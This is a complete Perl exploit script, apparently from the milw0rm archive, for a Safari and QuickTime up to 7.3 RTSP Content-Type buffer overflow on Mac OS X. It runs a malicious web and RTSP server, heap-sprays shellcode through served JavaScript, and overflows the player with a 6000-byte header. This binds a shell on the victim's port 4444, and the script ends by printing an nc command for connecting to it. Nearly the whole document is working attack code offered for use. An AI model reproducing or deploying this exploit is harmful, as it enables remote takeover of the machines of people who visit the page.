<html><head><title>Safari + Quicktime <= 7.3 RTSP Content-Type Remote BOF Exploit</title></head><pre>#!/usr/bin/perl
#
# quickbite.pl
#
# Safari + Quicktime &lt;= 7.3 RTSP Content-Type overflow exploit
# for Mac OS X (Intel)
#
# Tested with OS X 10.4.
# On victim, browse to http://server:8080/
# Binds shell on port 4444.
#
# by krafty
# 
# greets to sk, halvar, grugq, and all the ethnical hackers
# extra thanks to ddz for osx hackery
# sec-con greets to secwest, blackhat, hitb, hacklu, itu, xcon, syscan, poc
# sux to exploit traders - ZDI, WabiSabiLabi, and all you h0arders.
# milw0rm and packetstorm rule
# Bring back the days of technotronic and r00tshell! Freedom.
#
# Why is this exploit called &quot;Quickbite&quot;? Here's a dumb Apple joke:
# &quot;What's worse than biting into an apple and finding a worm?&quot;
# &quot;Finding half a worm&quot;.

use Socket;
use IO::Handle;
use constant MY_HTTP_PORT =&gt; 8080;

$shellcode = &quot;%uc031%u6850%u02ff%u5c11%ue789%u6a50%u6a01%u6a02%ub010%ucd61%u5780%u5050%u686a%ucd58%u8980%uec47%u6ab0%u80cd%u1eb0%u80cd%u5050%u5a6a%ucd58%uff80%ue44f%uf679%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u5454%u5053%u3bb0%u80cd&quot;;
$buf = chr(0x11) x 6000;

# don't touch anything below this line
$html = &lt;&lt;ENDHTML;
&lt;script&gt;
var prefix = unescape(&quot;%u3166%uB0C0%uCD42%uFE80%u3CC0%u7501%uB004%uCD01%u9080&quot;);
var shellcode = unescape(&quot;$shellcode&quot;);
shellcode = prefix + shellcode;
var spray = unescape(&quot;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&quot;);
do {
   spray += spray;
} while(spray.length &lt; 0xc0000);
memory = new Array();
for(i = 0; i &lt; 50; i++)
   memory[i] = spray + shellcode;
var url = &quot;rtsp://&quot; + location.host + &quot;/x.mp3&quot;;
document.write(&quot;&lt;EMBED SRC='&quot; + url + &quot;' TYPE='video/quicktime' AUTOPLAY='true' /&gt;&quot;);
&lt;/script&gt;
ENDHTML

$rtsp_body = 
&quot;v=0\r\n&quot; .
&quot;o=- 16689332712 1 IN IP4 0.0.0.0\r\n&quot; .
&quot;s=MPEG-1 or 2 Audio\r\n&quot; .
&quot;i=1.mp3\r\n&quot; .
&quot;t=0 0\r\n&quot; .
&quot;a=tool:hello\r\n&quot; .
&quot;a=type:broadcast\r\n&quot; .
&quot;a=control:*\r\n&quot; .
&quot;a=range:npt=0-213.077\r\n&quot; .
&quot;a=x-qt-text-nam:MPEG-1 or 2 Audio\r\n&quot; .
&quot;a=x-qt-text-inf:1.mp3\r\n&quot; .
&quot;m=audio 0 RTP/AVP 14\r\n&quot; .
&quot;c=IN IP4 0.0.0.0\r\n&quot; .
&quot;a=control:track1\r\n&quot;;
$content_length = length($rtsp_body);
$rtsp_header =
&quot;RTSP/1.0 200 OK\r\n&quot; .
&quot;CSeq: 1\r\n&quot; .
&quot;Date: 0x00 :P\r\n&quot; .
&quot;Content-Base: rtsp://0.0.0.0/x.mp3/\r\n&quot; .
&quot;Content-Type: $buf\r\n&quot; .
&quot;Content-Length: $content_length\r\n\r\n&quot;;
$rtsp = $rtsp_header . $rtsp_body;
$http_header = &quot;HTTP/1.1 200 OK\nContent-type: text/html\n\n&quot;;
$| = 1;

my $port = MY_HTTP_PORT;
my $protocol = getprotobyname('tcp');

socket(SOCK, AF_INET, SOCK_STREAM, $protocol) or die &quot;socket() failed: $!&quot;;
setsockopt(SOCK,SOL_SOCKET,SO_REUSEADDR,1) or die &quot;Can't set SO_REUSEADDR: $!&quot;;
my $my_addr = sockaddr_in($port,INADDR_ANY);
bind(SOCK,$my_addr) or die &quot;bind() failed: $!&quot;;
listen(SOCK,SOMAXCONN) or die &quot;listen() failed: $!&quot;;
warn &quot;waiting for incoming connections on port $port...\n&quot;;

$repeat = 1;
$victim = inet_aton(&quot;0.0.0.0&quot;);
while($repeat) {
    next unless my $remote_addr = accept(SESSION,SOCK);
    my ($port,$hisaddr) = sockaddr_in($remote_addr);
    warn &quot;Connection from [&quot;,inet_ntoa($hisaddr),&quot;,$port]\n&quot;;
    $victim = $hisaddr;
    SESSION-&gt;autoflush(1);
    $request = &quot;&quot;;
    while(&lt;SESSION&gt;) {
	$request_line = $_;
	$request .= $request_line;
	chomp($request_line);
        if($request_line =~ /DESCRIBE rtsp/) {
           $repeat = 0;
        }
	$x = length($request_line);
	if($x &lt;= 1) {
	    last;
	}
    }
    print STDERR $request;
    if($repeat) {
       print SESSION $http_header . $html;
    }
    else {
       print SESSION $rtsp;
    }
    warn &quot;Connection from [&quot;,inet_ntoa($hisaddr),&quot;,$port] finished\n&quot;;
    close SESSION;
}
print &quot;Connect to &quot;.inet_ntoa($victim).&quot;:4444 after 5 seconds\n&quot;;
print &quot;nc -nvv &quot;.inet_ntoa($victim).&quot; 4444\nEnjoy!\n&quot;;

# milw0rm.com [2008-07-06]</pre></html>